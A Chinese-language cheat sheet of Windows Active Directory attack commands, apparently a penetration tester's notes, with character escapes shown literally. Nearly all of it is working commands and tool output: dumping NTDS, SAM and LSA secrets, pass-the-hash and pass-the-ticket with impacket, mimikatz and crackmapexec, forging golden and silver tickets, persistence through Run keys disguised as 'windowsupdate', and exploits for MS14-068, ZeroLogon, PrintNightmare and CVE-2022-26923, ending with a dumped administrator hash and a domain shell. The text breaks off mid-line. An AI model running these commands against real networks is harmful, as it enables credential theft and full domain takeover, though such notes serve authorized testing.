\u5229\u7528NTDS\u8bfb\u53d6\u5bc6\u7801 \u521b\u5efaNTDS\u5feb\u7167 ntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\NTDS\" quit quit \u590d\u5236C\u76d8\u5f71\u5377\u526f\u672c vssadmin create shadow /for=C: \u5377\u5f71\u526f\u672c ID: {bbce8208-3ed9-4164-8022-72a59e54002a} \u5377\u5f71\u526f\u672c\u5377\u540d: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2 \u5229\u7528\u590d\u5236\u51fa\u6765\u7684\u5377\u540d\u5c06NTDS\u5feb\u7167\u590d\u5236\u51fa\u6765 copy $ShadowCopyName\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\ntds.dit.save \u5229\u7528impacket\u89e3 secretsdump -ntds ntds.dit.save -system system.save LOCAL \u5229\u7528\u6ce8\u518c\u8868\u8bfb\u53d6\u5bc6\u7801 \u5bfc\u51fa\u6ce8\u518c\u8868 reg save HKLM\\SAM \"C:\\Windows\\Temp\\sam.save\" reg save HKLM\\SECURITY \"C:\\Windows\\Temp\\security.save\" reg save HKLM\\SYSTEM \"C:\\Windows\\Temp\\system.save\" # Remote dumping of SAM & LSA secrets secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET' # Remote dumping of SAM & LSA secrets (pass-the-hash) secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET' # Remote dumping of SAM & LSA secrets (pass-the-ticket) secretsdump.py -k 'DOMAIN/USER@TARGET' # Offline dumping of LSA secrets from exported hives secretsdump.py -security '/path/to/security.save' -system '/path/to/system.save' LOCAL # Offline dumping of SAM secrets from exported hives secretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL # Offline dumping of SAM & LSA secrets from exported hives secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL PTH&PTK PTH\u5728kb2871997\u4e4b\u540e\u53ef\u80fd\u4f1a\u5931\u8d25\u3002\u4f46\u53ef\u4ee5\u4f7f\u7528\u673a\u5668\u7528\u6237\u6216\u57df\u7528\u6237\u7ed5\u8fc7\u3002 IPC&RPC\u76f8\u5173 impacket IPC\u8fde\u63a5 smbclient.py exp1/administrator:Aa123123..@192.168.14.100 \u8fde\u63a5\u4e4b\u540e\u9009\u62e9\u4e00\u4e2a\u8fde\u63a5\uff0cADMIN$\u9ed8\u8ba4\u5728Windows\u76ee\u5f55\u4e0b\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u6bcf\u4e2a\u78c1\u76d8\u90fd\u4f1a\u6709\u4e00\u4e2a\u81ea\u5df1\u7684\u8fde\u63a5\u3002 \u679a\u4e3e\u8ba1\u7b97\u673a\u7528\u6237 lookupsid.py exp1/administrator:Aa123123..@192.168.14.100 9999 samr\u4e5f\u53ef\u4ee5\u7528\u6765\u679a\u4e3e\u7528\u6237\uff0c\u8fd8\u9644\u5e26\u5b89\u5168\u7b56\u7565 samrdump.py exp1/administrator:Aa123123..@192.168.14.100 \u7ba1\u7406\u670d\u52a1 \u53ef\u4ee5\u81ea\u5efa\u670d\u52a1 services.py exp1/administrator:Aa123123..@192.168.14.100 list services.py exp1/administrator:Aa123123..@192.168.14.100 create -name test -display test -path \"cmd.exe /c start c:\\\\1.exe\" services.py exp1/administrator:Aa123123..@192.168.14.100 start -name test \u6ce8\u518c\u8868\u7ba1\u7406 reg.py exp1/administrator:Aa123123..@192.168.14.100 query -keyName HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\run \u6dfb\u52a0\u4e00\u4e2a\u81ea\u542f\u52a8\u9879\u76ee\uff0c\u53c2\u6570\u7684\u5927\u5c0f\u5199\u975e\u5e38\u654f\u611f reg.py exp1/administrator:Aa123123..@192.168.14.100 add -keyName HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v windowsupdate -vt REG_SZ -vd \"C:\\\\1.exe\" \u67e5\u4e00\u4e0b\u662f\u5426\u6dfb\u52a0\u6210\u529f reg.py exp1/administrator:Aa123123..@192.168.14.100 query -keyName HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\run -v windowsupdate \u53ef\u7528\u7684\u6ce8\u518c\u8868\u81ea\u542f\u52a8\u5982\u4e0b reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v windowsupdate /t reg_sz /d \"C:\\Windows\\system32\\cmd.exe\" /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v windowsupdate /t reg_sz /d \"C:\\Windows\\system32\\cmd.exe\" /f reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /v windowsupdate /t reg_sz /d \"C:\\Windows\\system32\\cmd.exe\" /f reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v windowsupdate /t reg_sz /d \"C:\\Windows\\system32\\cmd.exe\" /f reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v windowsupdate /t reg_sz /d \"C:\\Windows\\system32\\cmd.exe\" /f \u521b\u5efa\u670d\u52a1 C:\\Users\\ADmanager\\Desktop>sc \\1.1.1.1 create sangefor binpath= c:\\agent.exe start= auto sc c:\\1.exe \\\\1.1.1.1\\c$\\agent.exe \u8ba1\u5212\u4efb\u52a1 \u9ed8\u8ba4c\u76d8\u4e0b at \\\\1.1.1.1 16:33 1.exe SCHTASKS /Create /S 1.1.1.1 /U exp.com\\test /P \"Aa123123..\" /SC ONCE /ST 11:00 /TN test1 /TR c:\\1.exe /RU system WMI\u8fdc\u7a0b\u521b\u5efa\u8fdb\u7a0b wmic /node:1.1.1.1 /user:exp1\\administrator /password:xxxx process call create c:\\edr.exe \u7528list\u67e5\u770b\u662f\u5426\u8fd0\u884c\u6210\u529f wmic /node:1.1.1.1 /user:exp1\\administrator /password:xxxx process where name=\"edr.exe\" get executablepath SharpExec-\u63a8\u8350 sharpcollection \u6253\u5f00shell SharpExec.exe -m=wmiexec -i=192.168.14.100 -d=exp1.com -u=administrator -p=Aa123123.. \u6267\u884c\u547d\u4ee4 SharpExec.exe -m=wmi -i=192.168.14.100 -d=exp1.com -u=administrator -p=Aa123123.. -e=C:\\Windows\\System32\\cmd.exe -c=\"/c notepad.exe\" \u4e0a\u4f20\u6587\u4ef6 \u4e0a\u4f20\u540e\u4f1a\u81ea\u52a8\u8fd0\u884c SharpExec.exe -m=wmi -i=192.168.14.100 -d=exp1.com -u=administrator -p=Aa123123.. -f=\u672c\u5730\u8def\u5f84\\calc.exe -e=c:\\11.exe impacket\u65b9\u5f0f \u8fd9\u51e0\u4e2a\u811a\u672c\u7684\u4f7f\u7528\u53c2\u6570\u90fd\u662f\u4e00\u6837\u7684\uff0cexe\u548cpy\u90fd\u662f\u4e00\u6837\u7684 wmiexec.py \u52a8\u9759\u4e00\u822c psexec.py \u52a8\u9759\u5927 dcomexec.py \u52a8\u9759\u5c0f smbexec.py \u52a8\u9759\u5927 atexec.py \u6709\u660e\u6587\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b python2 wmiexec.py administrator:Aa123123.@10.0.2.254 \u6709hash\u7684\u60c5\u51b5\u4e0b \u5de5\u4f5c\u7ec4 psexec.py -hashes b9466d8c3afe060325ad3b83fa6627c7:379529bb14c7cc48eb314445c3529f49 workgroup/administrator@192.168.80.5 \u57df python2 wmiexec.py exp/administrator@10.0.2.254 -hashes :b660e61adc0aec1fe34711e6226fcc8c \u6709ase256\u7684\u60c5\u51b5 python2 wmiexec.py exp/administrator@10.0.2.5 -aesKey a38e70861856e2f4c98134b5288383c7992e63c5031a9540e636d2cafa9e88d6 mimikatz\u65b9\u5f0f ntlm\u53ef\u6539\u4e3arc4\u3001aes256\u3001aes128 sekurlsa::pth /user:win10 /domain:test.local /ntlm:6a6293bc0c56d7b9731e2d5506065e4a \u8fdc\u7a0b\u542f\u52a8\u4e00\u4e2a\u8fdb\u7a0b mimikatz sekurlsa::pth /user:admin /domain:ABENSON /ntlm:b660e61adc0aec1fe34711e6226fcc8c /run:\"cmd -w hidden\" \u5077\u53d6\u8fdb\u7a0bTOKEN steal_token PID WMI PTH\u6709\u6740\u6bd2\u62e6\u7684\u89e3\u51b3\u65b9\u5f0f \u4f7f\u7528wmiexec-RegOut\u89e3\u51b3 python3 wmipersist-Modify.py -hashes :b660e61adc0aec1fe34711e6226fcc8c exp.com/administrator@10.1.1.1 'ipconfig -all' -with-output \u4f7f\u7528wmiexec-Pro\u89e3\u51b3 \u901a\u8fc7WMI\u5199\u5165\u6ce8\u518c\u8868\u6765\u6267\u884cexe python3 wmi_reg_exec.py administrator@test.com -H xxxxxxx-f mimikatz.exe -a '\"coffie\" \"exit\"' python3 wmi_reg_exec.py administrator:abc123@dc -f aaa.exe DCERPC\u65b9\u5f0f https://github.com/Mr-Un1k0d3r/SCShell \u6709bof\u63d2\u4ef6 SCShell.exe target service payload domain username password SCShell.exe 192.168.197.131 XblAuthManager \"C:\\windows\\system32\\cmd.exe /C C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe C:\\payload.csproj\" . administrator Password mimikatz\u4f7f\u7528\u6253\u5f00cmd\u76f4\u63a5\u8fde sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:cmd.exe python scshell.py DOMAIN/USER@target -hashes 00000000000000000000000000000000:ad9827fcd039eadde017568170abdecce \u6279\u91cf\u65b9\u5f0f CS\u3001crackmap\u90fd\u53ef\u4ee5\u6279\u91cfPTH\uff0cCS\u76f4\u63a5\u70b9\u70b9\u70b9\u5c31\u884c\u4e86 crackmapexec \u8fd9\u4e2a\u5de5\u5177\u7684\u601d\u8def\u4f5c\u7528\u662f\u76f4\u63a5\u547d\u4ee4\u6267\u884c\u6216\u4f20\u9a6c SMB\u670d\u52a1\u63a2\u6d4b crackmapexec smb 192.168.3.0/24 \u67e5\u770b\u5bc6\u7801\u7b56\u7565 crackmapexec smb 10.0.2.5 -u administrator -p '123123' --pass-pol hashdump crackmapexec smb 10.0.2.5 -u administrator -p '123123' --sam \u679a\u4e3e\u7ec4 crackmapexec smb 10.0.2.5 -u administrator -p '123123' --local-groups \u57fa\u4e8esmbexec\u6267\u884c crackmapexec smb 10.0.2.5 -u administrator -p '123123' --exec-method smbexec -x 'whoami' \u57fa\u4e8edcom\u6267\u884c crackmapexec smb 10.0.2.5 -u administrator -p '123123' --exec-method mmcexec -x 'whoami' \u57fa\u4e8eatexec\u6267\u884c crackmapexec smb 10.0.2.5 -u administrator -p '123123' --exec-method wmiexec -X 'whoami' \u5229\u7528hash\u4f20\u9012 crackmapexec smb 10.0.2.5 -u administrator -H '579110c49145015c47ecd267657d3174' --exec-method atexec -x 'whoami' \u4e0a\u4f20\u6587\u4ef6 \u9ed8\u8ba4\u5230C\u76d8\uff0c\u6e90-\u76ee\u6807 crackmapexec smb 10.0.2.5 -u administrator -p '123123' --put-file 1.bin 32.bin \u67e5\u770b\u7535\u8111\u7684\u76d8\u7b26 crackmapexec smb 10.0.2.5 -u administrator -p '123123' --disks PowerSploit Invoke-WMIexec Invoke-SMBExec \u547d\u4ee4\u683c\u5f0f \u6267\u884c Invoke-WMIExec -Target 10.0.2.5 -Domain workgroup -Username uac -Hash 36aa83bdcab3c9fdaf321ca42a31c3fc -Command \"calc\" -verbose \u68c0\u67e5 Invoke-WMIExec -Target 192.168.100.20 -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 \u7ed5\u8fc7Win32_Process.create\u7684PTH 360LINTON\u5199\u7684vbs\u5de5\u5177\uff0c\u65e0\u9700445 \u4e3b\u8981\u529f\u80fd\uff1a1\u3001\u547d\u4ee4\u6267\u884c\uff1b2\u3001\u6587\u4ef6\u4e0a\u4f20\uff1b3\u3001\u6587\u4ef6\u4e0b\u8f7d \u6709\u547d\u4ee4\u56de\u663e\u6267\u884c\u65b9\u5f0f > cscript WMIHACKER_0.6.vbs /cmd 1.1.1.1 administrator \"Password!\" \"systeminfo\" 1 \u65e0\u547d\u4ee4\u56de\u663e > cscript WMIHACKER_0.6.vbs /cmd 1.1.1.1 administrator \"Password!\" \"systeminfo > c:\\1.txt\" 0 \u6a21\u62dfshell\u6a21\u5f0f > cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator \"Password!\" \u6587\u4ef6\u4e0a\u4f20-\u590d\u5236\u672c\u673acalc.exe\u5230\u8fdc\u7a0b\u4e3b\u673ac:\\calc.exe > cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator \"Password!\" \"c:\\windows\\system32\\calc.exe\" \"c:\\calc\" \u6587\u4ef6\u4e0b\u8f7d-\u4e0b\u8f7d\u8fdc\u7a0b\u4e3b\u673acalc.exe\u5230\u672c\u5730c:\\calc.exe > cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator \"Password!\" \"c:\\calc\" \"c:\\windows\\system32\\calc.exe\" \u4f7f\u7528wmi\u4e8b\u4ef6\u8ba2\u9605\u7684PTH lengyi\u5199\u7684\u5de5\u5177 \u4fee\u6539js\u6587\u4ef6\u4e2d\u7684\u547d\u4ee4 PS C:\\Users\\Administrator\\Desktop> New-WMIShell -Target '192.168.2.115' -Username 'administrator' -Password 'abc123!' -ProcessName 'notepad.exe' -JScriptPath C:\\Users\\Administrator\\Desktop\\payload.js -FilterName 'sdqwsda' -ConsumerName 'sdqwsda' \u4f7f\u7528hash\u767b\u5f55RDP win7\u6d4b\u8bd5\u5931\u8d25 sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:579110c49145015c47ecd267657d3174 \"/run:mstsc.exe /restrictedadmin\" PTT \u7968\u636e\u64cd\u4f5c kekeo\u7533\u8bf7\u7968\u636e kekeo tgt::ask /user:xx /domain:xxx /ntlm:xxx kekeo\u5bfc\u5165\u7968\u636e kekeo kerberos::ptt xxx.xxx cmd\u65b9\u5f0f cmd:>klist \u67e5\u770b\u7968\u636e cmd:>klist purge \u5220\u9664\u7968\u636e mimikatz\u65b9\u5f0f mimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u673a\u5668\u4e2d\u6240\u6709\u51ed\u8bc1 mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1 mimikatz # kerberos::ptt \u7968\u636e\u6587\u4ef6 //\u5c06\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d \u7968\u636e\u7684\u8f6c\u6362 \u7528mimikatz\uff0ckekeo\uff0crubeus\u751f\u6210\u7684\u51ed\u636e\u662f\u4ee5 .kirbi \u540e\u7f00\u7684\u3002impacket \u751f\u6210\u7684\u51ed\u636e\u7684\u540e\u7f00\u662f .ccache \u3002 \u4f7f\u7528ticket_converter.py\u53ef\u4ee5\u76f8\u4e92\u8f6c\u6362\u3002 \u4f7f\u7528KrbCredExport\u53ef\u4ee5\u5c06ccache\u8f6c\u6362\u4e3akirbi \u9ec4\u91d1\u7968\u636e \u5236\u4f5c\u9ec4\u91d1\u7968\u636e\u7684\u57fa\u7840\u662f\u83b7\u53d6\u4e86krbtgt\u8d26\u6237\u7684hash\u3002 \u901a\u8fc7\u5404\u79cd\u529e\u6cd5\u5bfc\u51fakrbtgt\u7684hash\uff0c\u7136\u540e\u5236\u4f5c\u7968\u636e\u3002 \u5236\u4f5c\u7968\u636e\uff0c\u53ef\u4ee5\u6307\u5b9a/rc4\u3001aes256\u3001aes128 kerberos::golden /admin:administrator /domain:exp1.com /sid:S-1-5-21-2245962460-1542597299-2684170513 /krbtgt:f123d13e88766c87ec8fbddd01a4a325 /ticket:admin.tck \u6ce8\u5165\u7968\u636e kerberos::/ptt 1.tck \u767d\u94f6\u7968\u636e \u767d\u94f6\u7968\u636e\u4f7f\u7528\u673a\u5668\u8d26\u6237\u7684ntlm hash\uff0c\u4f7f\u7528cifs\u6587\u4ef6\u670d\u52a1\uff0c\u4ec5\u80fd\u8bbf\u95ee\u7279\u5b9a\u670d\u52a1\uff0c\u4e0d\u9650\u4e8ecifs\u6587\u4ef6\u670d\u52a1 kerberos::golden /domain:test.local /sid:S-1-5-21-514356739-3204155868-1239341419 /target:dc.test.local /service:cifs /rc4:9150e40e4ec936a15baf384ca382a3df /user:dc$ /ptt \u6f0f\u6d1e\u5229\u7528 MS14-068 \u57fa\u4e8ePAC\u4ea7\u751f\u7684\u6f0f\u6d1e windows\u5229\u7528 MS14-068.exe -u cs@exp.com -s S-1-5-21-2245962460-1542597299-2684170513-1103 -d 10.0.2.254 -p Aa123123. Linux\u4e0a\u5229\u7528 MS14-068.py -u cs@exp.com -s S-1-5-21-2245962460-1542597299-2684170513-1103 -d 10.0.2.254 -p Aa123123. \u751f\u6210\u7968\u636e\u540e export KRB5CCNAME=xx.krb psexec.py exp.com/cs@dc.exp.com -k -no-pass -debug -dc-ip 10.0.2.254 -target-ip 10.0.2.254 keko\u5229\u7528 exploit::ms14068 /domain:exp.com /user:cs /password:Aa123123. /ptt CVE-2020-1472 (ZeroLogon) ZeroLogon\u901a\u8fc7\u7f6e\u7a7aDC\u673a\u5668\u7528\u6237\u7684\u5bc6\u7801\u6765\u6253DC python\u5229\u7528 \u7f6e\u7a7aDC\u673a\u5668\u7528\u6237\u5bc6\u7801 python3 cve-2020-1472-exploit.py WIN-I8E0L339L6E 10.0.2.254 \u8bfb\u53d6DC\u7684hash python3 secretsdump.py exp.com/WIN-I8E0L339L6E\\$@10.0.2.254 -just-dc -no-pass PTH\uff0cPTK\u8fde wmiexec.py exp/administrator@10.0.2.254 -hashes :b660e61adc0aec1fe34711e6226fcc8c \u5feb\u901f\u5229\u7528 zerologon-Shot-main mimikatz\u5229\u7528 \u6f0f\u6d1e\u68c0\u6d4b lsadump::zerologon /target:WIN-I8E0L339L6E.exp.com /account:DC$ \u7f6e\u7a7a lsadump::zerologon /target:WIN-I8E0L339L6E.exp.com /account:WIN-I8E0L339L6E$ /exploit \u67e5\u770b\u7968\u636e lsadump::dcsync /user:krbtgt /domain:exp.com \u751f\u6210\u9ec4\u91d1\u7968\u636e lsadump::dcsync /domain:exp.com /dc:WIN-I8E0L339L6E.exp.com /user:krbtgt /authuser:WIN-I8E0L339L6E$ /authdomain:exp /authpassword: /authntlm impacket\u751f\u6210\u9ec4\u91d1\u7968\u636e goldenPac.py test.local/jack:123456!@#@WIN-I8E0L339L6E.exp.com Powershell\u5229\u7528 Invoke-ZeroLogon.ps1 \u653b\u51fb Invoke-ZeroLogon DC.exp.com \u6062\u590d\u57df\u63a7\u5bc6\u7801 \u8bfb\u53d6DC\u6ce8\u518c\u8868 reg save HKLM\\SYSTEM system.save reg save HKLM\\SAM sam.save reg save HKLM\\SECURITY security.save get system.save get sam.save get security.save del /f system.save del /f sam.save del /f security.save \u8bfb\u539f\u5148\u673a\u5668\u7528\u6237HASH secretsdump.py -sam sam.save -system system.save -security security.save LOCAL \u8fd8\u539fHASH python3 reinstall_original_pw.py WIN-I8E0L339L6E 10.0.2.254 13adade6efd67a927131a3149a7693c4 exp.com/WIN-I8E0L339L6E\\$@10.0.2.254 -just-dc -no-pass CVE-2021-1675 \uff08printnightmare\uff09 \u901a\u8fc7print spooler\u670d\u52a1\u7684\u6f0f\u6d1e mimikatz\u5229\u7528 \u9700\u4fdd\u969cUNC\u8bbf\u95ee\u53ef\u4ee5\u533f\u540d printnightmare /try:10 misc::printnightmare /server:dc2.exp2.com /library:\\\\pc2.exp2.com\\share\\dll.dll misc::printnightmare /server:dc.exp1.com /library:\\\\pc1.exp.com\\q\\aa.dll /authuser:w1 /authdomain:exp2.com /authpassword:Aa123123 /u python\u5229\u7528 \u8f6c\u6210\u4e86exe ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll' ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL' Windows\u5f00\u542f\u533f\u540dsmb \u9700\u8981\u63d0\u6743\u81f3system mkdir C:\\share icacls C:\\share\\ /T /grant Anonymous logon:r icacls C:\\share\\ /T /grant Everyone:r New-SmbShare -Path C:\\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone' REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionShares /t REG_MULTI_SZ /d share /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v RestrictAnonymous /t REG_DWORD /d 0 /f Linux\u5f00\u542f\u533f\u540dsamba ~~\u5b89\u88c5samba\u670d\u52a1~~ \u76f4\u63a5\u4f7f\u7528impacket\u7684smbserver /etc/samba/samba.conf [global] workgroup = workgroup server string = test netbios name = MZ security = user map to guest = Bad User smb ports = 445 log file = /var/log/samba/log.%m max log size = 5 [smb] comment = Samba browseable = yes writeable = yes public = yes path = /tmp/ read only = no guest ok = yes ADCS\u4e2d\u7ee7\uff08\u57df\u8bc1\u4e66\u7ba1\u7406\u670d\u52a1\uff09 2021-7 \u5411DC\u53d1\u9001\u8bf7\u6c42\uff0c\u4f7fDC\u5411ADCS\u8fdb\u884c\u5f3a\u5236\u8ba4\u8bc1\uff0c\u5c06DC\u7684\u8ba4\u8bc1\u8bf7\u6c42\u4e2d\u7ee7\u5230ADCS\uff0c\u83b7\u53d6hash\u3002 \u9700\u8981\u6539\u52a8\u4e00\u4e0bimpacket\u4e0b\u7684\u4e09\u4e2a\u6587\u4ef6\uff0c\u4e4b\u540e\u91cd\u65b0\u8fd0\u884csetup impacket/impacket/examples/ntlmrelayx/utils/config.py impacket/impacket/examples/ntlmrelayx/attacks/httpattack.py impacket/examples/ntlmrelayx.py https://github.com/SecureAuthCorp/impacket/pull/1101/files python\u5229\u7528 \u4f7f\u7528ADCS\u65b9\u5f0f\u76d1\u542c\u4e2d\u7ee7 python3 ntlmrelayx.py -t https://192.168.52.100/certsrv/certfnsh.asp -smb2support --adcs \u5982\u679c\u8bc1\u4e66\u670d\u52a1\u5668\u662f\u57df\u63a7\uff0c\u9700\u8981\u6307\u5b9a\u57df\u63a7\u53c2\u6570\u3002 python3 ntlmrelayx.py -t https://192.168.14.100/Certsrv/certfnsh.asp -smb2support --adcs --template \"DomainController\" \u9700\u8981\u5f00\u542f\u4e86\u8bc1\u4e66\u670d\u52a1\u7684web\u8bbf\u95ee \u5411DC\u53d1\u9001\u8bf7\u6c42 python3 dementor.py -u pc1 -p Aa123123 -d exp1.com DC python Petitpotam.py 192.168.52.129 192.168.52.100 -u pc1 -p Aa123123 mimikatz\u5229\u7528 \u76d1\u542c\u548c\u4e0a\u9762\u4e00\u6837\u7684 misc::spooler /server:dc.exp1.com /connect:192.168.52.129 /authuser:pc1@exp1.com /authpassword:Aa123123 /u misc::efs /server:dc.exp1.com /connect:192.168.52.129 /noauth CVE-2022\u201326923 (ADCS\u6f0f\u6d1e\u6743\u9650\u63d0\u5347) \u539f\u7406 ADCS\u5728\u53d1\u8bc1\u4e66\u65f6\u53ea\u6821\u68c0\u8bf7\u6c42\u7684dnshostname\u53c2\u6570\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7ms-DS-MachineAccountQuota\u65b0\u5efa\u4e00\u4e2a\u865a\u62df\u673a\u5668\u5e76\u66f4\u6539\u865a\u62df\u673a\u5668\u7684dnshostname\u4e3a\u57df\u63a7\u7684\uff0c\u540e\u7eed\u5728\u7533\u8bf7\u8bc1\u4e66\u65f6\u4fbf\u7533\u8bf7\u5230\u4e86\u57df\u63a7\u7684\u8bc1\u4e66\u3002 \u5229\u7528 https://github.com/CravateRouge/bloodyAD \u9700\u8981\u4e00\u4e2a\u57df\u5185\u7528\u6237\uff0c\u9700\u8981\u77e5\u9053ADCS\u662f\u54ea\u4e00\u53f0\u3002 \u6211\u5728Linux\u4e0a\u6d4b\u8bd5\u65f6\uff0c\u5728\u83b7\u53d6tgt\u7684\u6b65\u9aa4\u51fa\u73b0\u4e86\u9519\u8bef\uff0c\u4f46\u662f\u91cd\u8bd5\u4e86\u51e0\u6b21\u53c8\u6210\u529f\u4e86\uff0c\u53ef\u80fd\u662f\u8fd8\u9700\u8981\u6307\u5b9adc\u3002 \u2514\u2500# certipy auth -pfx adcs1.pfx -ns 192.168.14.100 Certipy v3.0.0 - by Oliver Lyak (ly4k) [*] Using principal: adcs1@exp1.com [*] Trying to get TGT... [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type) \u4f7f\u7528bloodyAD\u9a8c\u8bc1\u57df\u7528\u6237\u662f\u5426\u80fd\u6dfb\u52a0\u673a\u5668\uff0cbloodyAD\u652f\u6301hash \u2514\u2500# python3 bloodyAD.py -d INTRA.a.com -u admin -p 'acbcdefg.' --host 192.168.14.100 getObjectAttributes 'DC=exp1,DC=com' ms-DS-MachineAccountQuota 1 \u2a2f { \"ms-DS-MachineAccountQuota\": 10 } \u521b\u5efa\u4e00\u4e2a\u673a\u5668 \u2514\u2500# python3 bloodyAD.py -d exp1.com -u adcs1 -p 'Aa123123' --host 192.168.14.100 addComputer 525 'Aa525525' Opening domain EXP1... Successfully added machine account 525$ with password Aa525525. addcomputer.py 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@' \u83b7\u53d6\u57df\u63a7\u7684dNSHostName python3 bloodyAD.py -d exp1.com -u adcs1 -p 'Aa123123' --host 192.168.14.100 getObjectAttributes 'CN=dc,ou=domain controllers,DC=exp1,DC=com' dNSHostName \u5c06\u521b\u5efa\u673a\u5668\u7684dNSHostName\u4fee\u6539\u6210\u57df\u63a7\u7684 \u2514\u2500# python3 bloodyAD.py -d exp1.com -u adcs1 -p 'Aa123123' --host 192.168.14.100 setAttribute 'CN=525,CN=Computers,DC=exp1,DC=com' dNSHostName '[\"dc.exp1.com\"]' dNSHostName set successfully \u67e5\u8be2525\u673a\u5668\u7684dnshostname\u53ef\u77e5\u5df2\u7ecf\u4fee\u6539\u6210\u529f\u4e86 \u2514\u2500# python3 bloodyAD.py -d exp1.com -u adcs1 -p 'Aa123123' --host 192.168.14.100 getObjectAttributes 'CN=525,cn=computers,DC=exp1,DC=com' dNSHostName { \"dNSHostName\": \"dc.exp1.com\" } \u4e3a525\u7533\u8bf7\u4e00\u4e2a\u8bc1\u4e66 \u2514\u2500# certipy req 'exp1.com/525$:Aa525525@192.168.14.100' -template Machine -dc-ip 192.168.14.100 -ca exp1-dc-CA Certipy v3.0.0 - by Oliver Lyak (ly4k) [*] Requesting certificate [*] Successfully requested certificate [*] Request ID is 48 [*] Got certificate with DNS Host Name 'dc.exp1.com' [*] Certificate object SID is None [*] Saved certificate and private key to 'dc.pfx' \u4f7f\u7528\u8bc1\u4e66\u83b7\u53d6tgt\uff0c\u4e5f\u53ef\u4ee5\u7528rubeus\u3001keko\u83b7\u53d6\u3002 \u2514\u2500# certipy auth -pfx dc.pfx -dc-ip 192.168.14.100 -ns 192.168.14.100 1 \u2a2f Certipy v3.0.0 - by Oliver Lyak (ly4k) [*] Using principal: dc$@exp1.com [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to 'dc.ccache' [*] Trying to retrieve NT hash for 'dc$' [*] Got NT hash for 'dc$@exp1.com': cc58bff8a6749646e92b603033bcbef7 \u62ff\u57df\u63a7\u673a\u5668\u7528\u6237hash dcsync \u2514\u2500# secretsdump.py exp1.com/dc\\$@192.168.14.100 -hashes :cc58bff8a6749646e92b603033bcbef7 -just-dc -just-dc-user administrator Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:0baecfec3a6898d4ac4df0977107d32e::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:fe02efc0d157faaad39ca3fed88044b1f0ca41eef9cc47a6df22c6795a8e3f96 Administrator:aes128-cts-hmac-sha1-96:b8f016f2b435595558d605103dd25a10 Administrator:des-cbc-md5:4a9ddc0e9186983d [*] Cleaning up... PTH\u4e00\u4e0b\u770b\u770b \u2514\u2500# wmiexec.py exp1/administrator@192.168.14.100 -hashes :0baecfec3a6898d4ac4df0977107d32e 1 \u2a2f Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] SMBv3.0 dialect used [!] Launching semi-interactive shell - Careful what you execute [!] Press help for extra shell commands C:\\>whoami exp1\\administrator \u5f02\u5e38\u60c5\u51b5\u5904\u7406\uff08\u614e\u7528\uff09 \u5f53\u51fa\u73b0\u4e0b\u9762\u9519\u8bef\u800c\u4e0d\u80fd\u5f97\u5230\u89e3\u51b3\u65f6\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u91cc\u7684\u529e\u6cd5\u3002 \u6211\u5728\u672c\u5730\u5c1d\u8bd5\u65f6\u5931\u8d25\u4e86\uff0c\u7136\u540e\u57df\u63a7\u5d29\u4e86\u91cd\u542f\u4e86\uff0c\u771f\u5b9e\u73af\u5883\u4e2d\u4e0d\u8981\u8fd9\u6837\u6253\u3002 bloodyAD and CVE-2022-26923 | Total Recall [-] Got 